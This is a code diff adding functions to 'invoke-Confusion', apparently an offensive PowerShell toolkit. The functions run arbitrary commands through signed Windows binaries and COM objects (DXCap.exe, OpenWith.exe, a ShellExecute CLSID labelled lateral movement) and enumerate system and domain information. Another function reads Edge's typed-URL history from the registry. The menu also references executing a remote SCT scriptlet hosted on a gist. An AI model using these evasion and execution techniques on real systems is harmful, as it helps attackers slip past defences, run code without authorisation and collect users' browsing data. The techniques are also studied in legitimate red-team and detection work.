@@ -1,4 +1,44 @@
 <#
+
+#######################################################################################
+#######################################################################################
+##  _                 _               _____              __           _              ##
+## (_)               | |             /  __ \            / _|         (_)             ##
+##  _ _ ____   _____ | | _____ ______| /  \/ ___  _ __ | |_ _   _ ___ _  ___  _ __   ##
+## | | '_ \ \ / / _ \| |/ / _ \______| |    / _ \| '_ \|  _| | | / __| |/ _ \| '_ \  ##
+## | | | | \ V / (_) |   <  __/      | \__/\ (_) | | | | | | |_| \__ \ | (_) | | | | ##
+## |_|_| |_|\_/ \___/|_|\_\___|       \____/\___/|_| |_|_|  \__,_|___/_|\___/|_| |_| ##
+#######################################################################################
+#######################################################################################
+###########                                                             ########### 
+###########                                                             ###########
+###########                                                             ###########
+###########                                                             ###########
+###########                                                             ###########
+###########                                                             ###########
+###########                                                             ###########
+###########                                                             ###########
+###########                                                             ###########
+###########                                                             ###########
+###########                                                             ###########
+###########                                                             ###########
+###########                                                             ###########
+###########                                                             ###########
+###########                                                             ###########
+###########                                                             ###########
+###########                                                             ###########
+                                 ###########
+
+
+
+
+
+
+
+
+
+
+ 
   .Author ( @harr0ey ) 
   .Lisence BSD3 
   .Required Dependencies: None
@@ -37,9 +77,277 @@
 
   .Example
     PS:> invoke-XMLTransform -XSL URL -XML URL
+  
+
+  .Example
+    PS:> invoke-DxCap -CML calc.exe
 
 
-#> 
+  .Example
+    PS:>  invoke-OpenWith -CML notepad.exe
+
+
+  .Example
+    PS:> invoke-ApplicationShellExecute -CML calc.exe
+
+
+      .Example
+    PS:> 
+
+
+
+
+#>
+Write-Host -ForegroundColor Green "
+ _                 _               _____              __           _             
+(_)               | |             /  __ \            / _|         (_)            
+ _ _ ____   _____ | | _____ ______| /  \/ ___  _ __ | |_ _   _ ___ _  ___  _ __  
+| | '_ \ \ / / _ \| |/ / _ \______| |    / _ \| '_ \|  _| | | / __| |/ _ \| '_ \ 
+| | | | \ V / (_) |   <  __/      | \__/\ (_) | | | | | | |_| \__ \ | (_) | | | |
+|_|_| |_|\_/ \___/|_|\_\___|       \____/\___/|_| |_|_|  \__,_|___/_|\___/|_| |_|
+---------------------------------------------------------------------------------
+
+1  invoke-ConfusionJS -Command 'var invokeMethod = new ActiveXObject("WScript.Shell");invokeMethod.Run("notepad.exe")'
+2  invoke-Confusions-LLMTCOMCLSID -CLSID 
+3  invoke-SCTExecution -SCT www.gist.githubusercontent.com/homjxi0e/cc9e5f07308745be89288834ca567d22/raw/1e3d2e5f2a663d339d6cc60d27e7e5e4e0827873/SCTEx.sct
+4  invoke-DLLLaunchApplication -CML calc.exe
+5  invoke-lateralmovement -Command calc.exe
+6  invoke-VBNET -CMLShell calc.exe
+7  invoke-XMLTransform -XSL URL -XML URL
+8  invoke-OpenWith -CML notepad.exe
+9  invoke-invoke-DxCap -CML notepad.exe
+10 invoke-ApplicationShellExecute -CML calc.exe  
+11 invoke-ADinfo -Type List    
+12 Get-TokenMsftEdge -Type List                                                                      
+                                                                                 
+"
+Read-Host -Prompt Enter
+
+
+ function invoke-DxCap {
+
+ <#
+
+
+  .Author ( @harr0ey ) 
+  .Lisence BSD3 
+  .Required Dependencies: None
+  .Optional Dependencies: None
+
+
+
+  .Broadly
+   Tool Command line Execution Via DXcap.exe Use DXCap.exe To Run CML 
+
+
+
+   .Example 
+     PS:> invoke-invoke-DxCap -CML notepad.exe
+
+#>
+ 
+  [CmdletBinding()]
+
+    param (
+    
+      [Parameter(Mandatory=$true)] 
+       [Parameter(Position = 0, ParameterSetName = 'CML')]
+        [String]$CML
+    
+    )
+
+
+
+    if ($like = $CML) {
+    
+     $ADDValueOpenWith = $CML
+     DXcap.exe -c $CML
+    
+
+    }
+   }
+
+
+
+ function invoke-ADinfo {
+
+ <#
+
+
+  .Author ( @harr0ey ) 
+  .Lisence BSD3 
+  .Required Dependencies: None
+  .Optional Dependencies: None
+
+
+
+  .Broadly
+   display System INFo List AD/Domain Users 
+
+
+
+   .Example 
+     PS:> invoke-ADinfo -Type List
+
+#>
+ 
+  [CmdletBinding()]
+
+    param (
+    
+      [Parameter(Mandatory=$true)] 
+       [Parameter(Position = 0, ParameterSetName = 'Type')]
+        [String]$Type
+    
+    )
+
+
+
+    if ($like = $Type) {
+    $WscriptSysinfo = [activator]::CreateInstance([type]::GetTypeFromCLSID("{093FF999-1EA0-4079-9525-9614C3504B74}"))
+    $CIMSysinfo = Get-CimInstance CIM_System 
+    $CIMSysinfo+$WscriptSysinfo
+
+    }
+   }
+
+    function invoke-ApplicationShellExecute {
+
+ <#
+
+
+  .Author ( @harr0ey ) 
+  .Lisence BSD3 
+  .Required Dependencies: None
+  .Optional Dependencies: None
+
+
+
+  .Broadly
+   Execute Command line Via use lateral Movement CLSID/COM
+
+
+
+   .Example 
+     PS:> invoke-ApplicationShellExecute -CML calc.exe
+
+#>
+ 
+  [CmdletBinding()]
+
+    param (
+    
+      [Parameter(Mandatory=$true)] 
+       [Parameter(Position = 0, ParameterSetName = 'CML')]
+        [String]$CML
+    
+    )
+
+
+
+    if ($like = $CML) {
+    
+          $ADDValueLLMTShell = $CML
+          $s2 = [activator]::CreateInstance([type]::GetTypeFromCLSID("{13709620-C279-11CE-A49E-444553540000}"))
+          $s2.Application.ShellExecute("pcalua")
+          $s2.Application.ShellExecute("pcalua")
+          $s2.Application.ShellExecute("pcalua")
+          $s2.Application.ShellExecute("pcalua")
+          $s2.Application.ShellExecute("pcalua")
+          $s2.Application.ShellExecute("pcalua")
+          $s2.Application.ShellExecute("pcalua")
+          $s2.Application.ShellExecute("pcalua")
+          $s2.Application.ShellExecute("pcalua")
+          $s2.Application.ShellExecute("pcalua")
+          $s2.Application.ShellExecute("$CML")
+
+    }
+   }
+
+ function Get-TokenMsftEdge {
+
+
+    [CmdletBinding(SupportsPaging = $true)]    
+
+    param( 
+
+            [Parameter(Mandatory=$True,Position=0)]
+
+
+
+                [parameter(Mandatory=$true,ParameterSetName="NULL")]
+
+   
+
+            [System.String]$Type
+
+)
+
+
+
+if ($null = $Type) {
+
+
+
+$SnifferEdgedrag = Join-Path -Path "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\" -ChildPath TypedURLs
+
+
+
+Get-ItemProperty -Path $SnifferEdgedrag 
+
+   ( Out-String )
+
+  
+
+  }
+   }
+
+
+
+
+ function invoke-OpenWith {
+
+ <#
+
+
+  .Author ( @harr0ey ) 
+  .Lisence BSD3 
+  .Required Dependencies: None
+  .Optional Dependencies: None
+
+
+
+  .Broadly
+   Tool Command line Execution Via OpenWith.exe USe OpenWith To Run Command Line Via Default Program 
+
+
+
+   .Example 
+     PS:> invoke-OpenWith -CML notepad.exe
+
+#>
+ 
+  [CmdletBinding()]
+
+    param (
+    
+      [Parameter(Mandatory=$true)] 
+       [Parameter(Position = 0, ParameterSetName = 'CML')]
+        [String]$CML
+    
+    )
+
+
+
+    if ($like = $CML) {
+    
+     $ADDValueOpenWith = $CML
+     OpenWith.exe /c $CML
+    
+
+    }
+   }
+
 
 function invoke-XMLTransform {
 
